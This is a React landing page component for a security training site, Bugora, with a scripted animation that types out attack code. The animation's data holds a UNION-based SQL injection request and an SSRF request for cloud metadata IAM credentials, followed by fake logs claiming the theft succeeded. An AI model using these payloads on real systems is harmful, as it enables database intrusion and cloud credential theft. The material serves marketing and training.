import React from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield, Zap, Target, BookOpen, Layers, ArrowRight, CheckCircle, Crown, FlaskConical, Menu, X, Terminal as TerminalIcon } from 'lucide-react';
import './Landing.css';

const Landing = () => {
    const navigate = useNavigate();
    const [isMenuOpen, setIsMenuOpen] = React.useState(false);

    // Live Hack Simulation State
    const [hackStep, setHackStep] = React.useState(0);
    const [sequenceIndex, setSequenceIndex] = React.useState(0);
    const [displayCode, setDisplayCode] = React.useState("");
    const [attackIndex, setAttackIndex] = React.useState(0);

    // Multi-stage Attacks with Human Keystrokes (Expert Mode)
    // '<' represents backspace, '|' represents a long pause (thought pause)
    const attacks = [
        {
            url: "bugora.app/lessons/advanced-sql-discovery",
            keystrokes: "import requests\n\n# Probing for Union-based SQLi\ntarget = \"http://api.target.com/users?id=1'\"\nr = requests.get(target + \" UNION SELECT NULL,NULL,NULL,user(),database()-- -\")\nprint(r.text)",
            tokens: [
                { text: "import", type: "keyword" },
                { text: " requests\n\n", type: "plain" },
                { text: "# Probing for Union-based SQLi\n", type: "comment" },
                { text: "target", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "\"http://api.target.com/users?id=1'\"", type: "string" },
                { text: "\n", type: "plain" },
                { text: "r", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "requests", type: "method" },
                { text: ".get", type: "method" },
                { text: "(target + ", type: "plain" },
                { text: "\" UNION SELECT NULL,NULL,NULL,user(),database()-- -\"", type: "string" },
                { text: ")\n", type: "plain" },
                { text: "print", type: "keyword" },
                { text: "(r.text)", type: "plain" }
            ],
            terminal: [
                { text: "[*] Initializing local environment for sqlmap-style probe...", type: "info", delay: 0.5 },
                { text: "[*] Testing socket connection to api.target.com:80", type: "info", delay: 1.5 },
                { text: "[+] Connection established. Latency: 42ms", type: "success", delay: 2.2 },
                { text: "[*] Scanning for potential injection points (4 parameters)...", type: "info", delay: 3.5 },
                { text: "[!] HTTP 500: Server error detected on 'id' param. Probing offsets...", type: "info", delay: 5.0 },
                { text: "[*] Injecting UNION-based payload (offset 4,5,6)...", type: "info", delay: 6.5 },
                { text: "[!] SUCCESS: Data stream extracted from 'users' table.", type: "success", delay: 8.0 },
                { text: "[*] Parsing database metadata and user tables...", type: "info", delay: 9.0 },
                { text: "[+] DB: 'vault_prod' | User: 'root@localhost' leak confirmed.", type: "success", delay: 10.5 }
            ],
            summary: "Union-based SQL Injection successful. Extracted database 'vault_prod' and confirmed 'root' access. Database schema exposed."
        },
        {
            url: "bugora.app/lessons/ssrf-iam-pillage",
            keystrokes: "import requests\n\n# Escalating SSRF to IAM Exfiltration\nm_url = \"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-production-role\"\nr = requests.post(\"http://svc.internal-proxy/v1\", json={\"forward\": m_url})\nprint(r.json())",
            tokens: [
                { text: "import", type: "keyword" },
                { text: " requests\n\n", type: "plain" },
                { text: "# Escalating SSRF to IAM Exfiltration\n", type: "comment" },
                { text: "m_url", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "\"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-production-role\"", type: "string" },
                { text: "\n", type: "plain" },
                { text: "r", type: "variable" },
                { text: " = ", type: "operator" },
                { text: "requests", type: "method" },
                { text: ".post", type: "method" },
                { text: "(\"http://svc.internal-proxy/v1\", json={", type: "plain" },
                { text: "\"forward\"", type: "string" },
                { text: ": m_url})\n", type: "plain" },
                { text: "print", type: "keyword" },
                { text: "(r.json())", type: "plain" }
            ],
            terminal: [
                { text: "[*] Pre-flight: Verifying server-side listener on port :v1", type: "info", delay: 0.8 },
                { text: "[*] Routing through internal service proxy...", type: "info", delay: 1.8 },
                { text: "[+] Proxy tunnel established at 10.0.42.12", type: "success", delay: 2.5 },
                { text: "[*] Probing cloud metadata endpoint (169.254.169.254)...", type: "info", delay: 4.0 },
                { text: "[*] Extracting IAM credentials from metadata API...", type: "info", delay: 5.5 },
                { text: "[!] CRITICAL: Credentials found for production-role!", type: "success", delay: 7.0 },
                { text: "[+] AccessKeyId: ASIA... | SecretAccessKey: [REDACTED]", type: "success", delay: 8.5 },
                { text: "[+] SessionToken: FwoGZXIvYXdz... (Valid: 3600s)", type: "success", delay: 9.8 },
                { text: "[*] Session successfully hijacked. Persistence established.", type: "info", delay: 11.2 }
            ],
            summary: "SSRF exploit bypassed proxy layers to exfiltrate IAM role 'web-app-production-role' credentials. Session hijack completed."
        }
    ];

    const currentAttack = attacks[attackIndex];

    React.useEffect(() => {
        let timeout;
        if (hackStep === 0) {
            // Smooth Typing Animation (Linear)
            if (sequenceIndex < currentAttack.keystrokes.length) {
                const char = currentAttack.keystrokes[sequenceIndex];
                const delay = Math.random() * 40 + 30; // Faster but smooth speed

                timeout = setTimeout(() => {
                    setDisplayCode(prev => prev + char);
                    setSequenceIndex(prev => prev + 1);
                }, delay);
            } else {
                timeout = setTimeout(() => setHackStep(1), 1500);
            }
        } else if (hackStep === 1) {
            // Executing - Extended pause for realistic background processing & log reading
            timeout = setTimeout(() => setHackStep(2), 5500);
        } else if (hackStep === 2) {
            // Success results display - longer before modal
            timeout = setTimeout(() => setHackStep(3), 3500);
        }
        return () => clearTimeout(timeout);
    }, [sequenceIndex, hackStep, currentAttack, attackIndex]);

    const nextAttack = () => {
        if (attackIndex < attacks.length - 1) {
            setAttackIndex(prev => prev + 1);
            setSequenceIndex(0);
            setDisplayCode("");
            setHackStep(0);
        } else {
            navigate('/challenges');
        }
    };

    const resetSimulation = () => {
        setSequenceIndex(0);
        setDisplayCode("");
        setHackStep(0);
        setAttackIndex(0);
    };

    // Render logic for organic code (Tokenized on the fly for syntax highlighting)
    const renderCode = () => {
        // We use the reference 'tokens' for the final version to determine highlighting
        // But we slice the text based on what's actually in displayCode
        let charPointer = 0;
        let remainingDisplay = displayCode;

        return currentAttack.tokens.map((token, index) => {
            if (remainingDisplay.length === 0) return null;

            const tokenLen = token.text.length;
            const content = remainingDisplay.slice(0, tokenLen);
            remainingDisplay = remainingDisplay.slice(tokenLen);

            return (
                <span key={`${attackIndex}-${index}`} className={`c-${token.type}`}>
                    {content}
                </span>
            );
        });
    };

    return (
        <div className="landing-page">
            {/* Header / Nav */}
            <nav className={`landing-nav ${isMenuOpen ? 'menu-active' : ''}`}>
                <div className="nav-container">
                    <div className="landing-logo">
                        <img src="/logo.svg" alt="Bugora" />
                        <span className="brand-text">Bug<span className="brand-accent">ora</span></span>
                    </div>

                    {/* Mobile Toggle */}
                    <button className="mobile-toggle" onClick={() => setIsMenuOpen(!isMenuOpen)}>
                        {isMenuOpen ? <X /> : <Menu />}
                    </button>

                    <div className={`nav-links ${isMenuOpen ? 'open' : ''}`}>
                        <div className="mobile-menu-backdrop" onClick={() => setIsMenuOpen(false)}></div>
                        <a href="#features" onClick={() => setIsMenuOpen(false)}>Features</a>
                        <a href="#curriculum" onClick={() => setIsMenuOpen(false)}>Curriculum</a>
                        <div className="nav-actions">
                            <button className="nav-btn" onClick={() => { navigate('/auth/login'); setIsMenuOpen(false); }}>Login</button>
                            <button className="nav-btn primary" onClick={() => { navigate('/auth/signup'); setIsMenuOpen(false); }}>Get Started</button>
                        </div>

                        {/* Decorative elements for mobile menu */}
                        <div className="mobile-menu-decoration">
                            <div className="glass-blob"></div>
                            <div className="glass-blob bottom"></div>
                        </div>
                    </div>
                </div>
            </nav>

            {/* Hero Section */}
            <header className="landing-hero">
                <div className="hero-background-wrapper">
                    <img
                        src="/hero-concept.png"
                        alt="Cybersecurity Concept"
                        className="hero-bg-image"
                    />
                    <div className="hero-overlay"></div>
                </div>

                <div className="container">
                    <div className="hero-content">
                        <div className="badge-promo animate-fade-in">
                            <span className="badge-icon"><Zap size={12} /></span>
                            v1.0 Official Launch
                        </div>
                        <h1 className="hero-title animate-fade-in-up">
                            Master the Art of <br />
                            <span className="text-gradient">Cyber Exploration</span>
                        </h1>
                        <p className="hero-subtitle animate-fade-in-up" style={{ animationDelay: '0.1s' }}>
                            Bountypaper is the premium interactive playground where security researchers transform theory into critical findings through immersive labs.
                        </p>
                        <div className="hero-actions animate-fade-in-up" style={{ animationDelay: '0.2s' }}>
                            <button className="btn-hero-primary" onClick={() => navigate('/auth/signup')}>
                                Start Learning Now <ArrowRight size={18} />
                            </button>
                            <button className="btn-hero-secondary" onClick={() => navigate('/onboarding/welcome')}>
                                Explore Platform
                            </button>
                        </div>
                    </div>
                </div>
            </header>

            {/* App Reveal Section */}
            <section className="app-reveal">
                <div className="container">
                    <div className="reveal-wrapper animate-fade-in-up" style={{ animationDelay: '0.3s' }}>
                        <div className="reveal-glass">
                            {/* Browser Header */}
                            <div className="reveal-header">
                                <div className="header-controls">
                                    <div className="dot red"></div>
                                    <div className="dot yellow"></div>
                                    <div className="dot green"></div>
                                </div>
                                <div className="header-address-bar">
                                    <Shield size={12} className="lock-icon" />
                                    <span className="protocol">https://</span>
                                    <span className="domain">{currentAttack.url.split('/')[0]}</span>
                                    <span className="path">/{currentAttack.url.split('/').slice(1).join('/')}</span>
                                </div>
                            </div>

                            <div className="reveal-body">
                                <div className="reveal-app-layout">
                                    {/* Sidebar */}
                                    <div className="reveal-sidebar">
                                        <div className="sidebar-group">
                                            <div className="sidebar-icon active" title="Explorer"><Layers size={22} /></div>
                                            <div className="sidebar-icon" title="Search"><Target size={22} /></div>
                                            <div className="sidebar-icon" title="Source Control"><BookOpen size={22} /></div>
                                        </div>
                                        <div className="sidebar-group bottom">
                                            <div className="sidebar-icon" title="Extensions"><FlaskConical size={22} /></div>
                                            <div className="sidebar-icon" title="Profile"><Crown size={22} /></div>
                                        </div>
                                    </div>

                                    <div className="reveal-main">
                                        <div className="simulation-container">
                                            {/* Code Editor Header */}
                                            <div className="editor-header-tabs">
                                                <div className="tab active">
                                                    <span className="file-icon python">py</span>
                                                    <span className="tab-name">payload.py</span>
                                                    <X size={10} className="close-x" />
                                                </div>
                                                <div className="tab">
                                                    <span className="file-icon">txt</span>
                                                    <span className="tab-name">log.txt</span>
                                                </div>
                                                {hackStep === 1 && (
                                                    <div className="editor-status-badge running animate-pulse">
                                                        <span className="desktop-text">Running script...</span>
                                                        <span className="mobile-text">Executing...</span>
                                                    </div>
                                                )}
                                            </div>

                                            {/* Code Editor Body */}
                                            <div className="editor-content">
                                                <div className="line-numbers">
                                                    {[1, 2, 3, 4, 5, 6, 7, 8].map(n => <div key={n}>{n}</div>)}
                                                </div>
                                                <div className="code-area">
                                                    <pre>{renderCode()}<span className="cursor-block"></span></pre>
                                                </div>
                                            </div>

                                            {/* Terminal Output */}
                                            <div className={`terminal-drawer ${hackStep >= 1 ? 'open' : ''}`}>
                                                <div className="terminal-header">
                                                    <div className="term-tabs">
                                                        <span className="term-tab active">TERMINAL</span>
                                                        <span className="term-tab">OUTPUT</span>
                                                        <span className="term-tab">DEBUG</span>
                                                    </div>
                                                </div>
                                                <div className="terminal-body">
                                                    {hackStep >= 1 && (
                                                        <div className="term-line command">
                                                            <span className="prompt-user">root@kali</span>
                                                            <span className="prompt-sep">:</span>
                                                            <span className="prompt-dir">~/labs</span>
                                                            <span className="prompt-char">#</span> python3 payload.py
                                                        </div>
                                                    )}
                                                    {hackStep >= 2 && currentAttack.terminal.map((line, i) => (
                                                        <div key={i} className={`term-line ${line.type} animate-type`} style={{ animationDelay: `${line.delay}s` }}>
                                                            {line.text}
                                                        </div>
                                                    ))}
                                                </div>
                                            </div>

                                            {/* Victory Modal */}
                                            {hackStep >= 3 && (
                                                <div className="simulation-modal-overlay">
                                                    <div className="victory-modal animate-pop-in">
                                                        <div className="victory-glow"></div>
                                                        <div className="victory-icon-wrapper">
                                                            <div className="victory-ring"></div>
                                                            <CheckCircle size={48} className="victory-icon" />
                                                        </div>

                                                        <h3 className="victory-title">
                                                            {attackIndex === 0 ? "Vulnerability Found" : "System Compromised"}
                                                        </h3>

                                                        {/* Attack Result Terminal UI */}
                                                        <div className="modal-result-terminal">
                                                            <div className="mt-header">
                                                                <TerminalIcon size={12} />
                                                                <span>Execution Result - payload.py</span>
                                                            </div>
                                                            <div className="mt-body">
                                                                <div className="mt-line success">
                                                                    {currentAttack.summary}
                                                                </div>
                                                                <div className="mt-line cursor">_</div>
                                                            </div>
                                                        </div>

                                                        <div className="xp-gain">
                                                            <span className="plus">+</span>{attackIndex === 0 ? "50" : "150"} <span className="unit">XP</span>
                                                        </div>

                                                        <button
                                                            className="btn-victory-primary"
                                                            onClick={nextAttack}
                                                        >
                                                            {attackIndex === 0 ? (
                                                                <>Next Phase <ArrowRight size={18} /></>
                                                            ) : (
                                                                <><Zap size={18} fill="currentColor" /> Access Real Lab</>
                                                            )}
                                                        </button>
                                                        <button className="btn-victory-text" onClick={resetSimulation}>
                                                            Reset Lab
                                                        </button>
                                                    </div>
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="reveal-glow"></div>

                        <div className="floating-stat s1">
                            <Layers size={14} /> 50+ Real Labs
                        </div>
                        <div className="floating-stat s2">
                            <Zap size={14} /> Interactive 0-Day Playground
                        </div>
                    </div>
                </div>
            </section>

            {/* Feature Highlights */}
            <section id="features" className="landing-features">
                <div className="container">
                    <div className="section-header animate-fade-in-up">
                        <h2 className="text-gradient">The Bugora Edge</h2>
                        <p className="subtitle">Everything you need to go from amateur to elite bug hunter.</p>
                    </div>
                    <div className="feature-grid">
                        <div className="feature-card animate-fade-in-up" style={{ animationDelay: '0.1s' }}>
                            <div className="feature-icon"><Layers /></div>
                            <h3>Immersive Curriculum</h3>
                            <p>Structured paths covering OWASP Top 10, Cloud Security, and advanced exploitation.</p>
                        </div>
                        <div className="feature-card animate-fade-in-up" style={{ animationDelay: '0.2s' }}>
                            <div className="feature-icon"><FlaskConical /></div>
                            <h3>On-Demand Labs</h3>
                            <p>Launch interactive targets in seconds. Practice recon, exploitation, and reporting.</p>
                        </div>
                        <div className="feature-card animate-fade-in-up" style={{ animationDelay: '0.3s' }}>
                            <div className="feature-icon"><Crown /></div>
                            <h3>Gamified Rewards</h3>
                            <p>Earn XP, unlock badges, and climb the leaderboard as you find more bugs.</p>
                        </div>
                    </div>
                </div>
            </section>

            {/* Curriculum Preview */}
            <section id="curriculum" className="landing-curriculum">
                <div className="container">
                    <div className="curriculum-layout">
                        <div className="curriculum-info animate-fade-in-up">
                            <h2 className="text-display">Real-World <br /><span className="text-gradient">Scenarios</span></h2>
                            <p>We don't teach theory in a vacuum. Every module is based on actual findings from live bug bounty programs.</p>

                            <ul className="curriculum-list">
                                <li><CheckCircle size={18} /> Advanced SQL Injection Techniques</li>
                                <li><CheckCircle size={18} /> SSRF & Cloud Metadata Exfiltration</li>
                                <li><CheckCircle size={18} /> Cross-Site Scripting (XSS) Masterclass</li>
                                <li><CheckCircle size={18} /> Authentication & IDOR Flaws</li>
                            </ul>

                            <button className="btn-secondary mt-lg" onClick={() => navigate('/courses')}>
                                View Full Syllabus
                            </button>
                        </div>
                        <div className="curriculum-visual animate-fade-in-up">
                            <div className="module-stack">
                                <div className="module-item p1">SQLi Mastery</div>
                                <div className="module-item p2">XSS Exploitation</div>
                                <div className="module-item p3">Cloud Security</div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* Pricing Section */}
            <section className="landing-pricing">
                <div className="container">
                    <div className="pricing-card animate-fade-in-up">
                        <div className="pricing-header">
                            <h2 className="text-display">Join the Elite</h2>
                            <p>Get full access to all labs, courses, and certifications.</p>
                        </div>
                        <div className="price-tag">
                            <span className="currency">$</span>
                            <span className="amount">19</span>
                            <span className="period">/month</span>
                        </div>
                        <ul className="pricing-features">
                            <li><CheckCircle size={16} /> Unlimited Lab Runtime</li>
                            <li><CheckCircle size={16} /> Exclusive Premium Modules</li>
                            <li><CheckCircle size={16} /> Exclusive 0-Day Labs</li>
                            <li><CheckCircle size={16} /> Advanced Exploit Payloads</li>
                            <li><CheckCircle size={16} /> Priority Lab Support</li>
                        </ul>
                        <button className="btn-primary btn-lg" onClick={() => navigate('/auth/signup')}>
                            Start Pro Journey <ArrowRight size={18} />
                        </button>
                        <p className="pricing-note">No credit card required to start free trial.</p>
                    </div>
                </div>
            </section>

            {/* Footer */}
            <footer className="landing-footer">
                <div className="container">
                    <div className="footer-content">
                        <div className="footer-brand">
                            <img src="/logo.svg" alt="Bugora" />
                            <span>Bug<span className="brand-accent">ora</span> v1.0</span>
                        </div>
                        <div className="footer-links">
                            <a href="#">Terms</a>
                            <a href="#">Privacy</a>
                            <a href="#">Support</a>
                        </div>
                        <p className="copyright">&copy; 2026 Bugora. Mastery Unleashed.</p>
                    </div>
                </div>
            </footer>
        </div>
    );
};

export default Landing;
